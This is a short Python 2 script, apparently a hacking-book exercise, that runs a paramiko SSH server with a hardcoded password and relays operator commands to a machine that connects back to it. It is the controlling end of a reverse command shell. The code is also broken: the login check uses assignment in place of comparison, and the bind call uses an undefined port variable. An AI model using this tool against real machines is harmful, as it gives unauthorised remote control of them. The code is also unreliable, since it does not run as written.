import socket
import paramiko
import threading
import sys
host_key = paramiko.RSAKey(filename='test_rsa.key')
class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def channel_request(self, kind, channid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username='justin') and (password='lovesthepython'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
server = sys.argv[1]
ssh_port = int(sys.argv[2])
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, port))
    sock.listen(100)
    print '[+] Listening on connections...'
    client, addr = sock.accept()
except Exception, e:
    print '[-] Listen failed: '+ str(e)
    sys.exit(0)
print '[+] Got a connection.'


try:
    bhsession = paramiko.Transport(client)
    bhsession.add_server_key(host_key)
    server = Server()
    try:
        bhsession.start_server(server=server)
    except paramiko.SSHException, x:
        print '[-] SSH negotiation failed!'
    chan = bhsession.accept(20)
    print '[+] Authenticated!'
    print chan.recv(1024)
    chan.send('Welcome to bh_ssd') 
    while True:
        try:
            command = raw_input('Enter command: ').strip('\n')
            if command != 'exit':
                chan.send(command)
                print chan.recv(1024)+ '\n'
            else:
                chan.send('exit')
                print 'exiting'
                bhsession.close()
                raise Exception ('exit')
        except KeyboardInterrupt:
            bhsession.close()

except Exception,e:
    print '[-] caught exception: '+str(e)
    try:
        bhsession.close()
    except:
        pass

    sys.exit(1)    
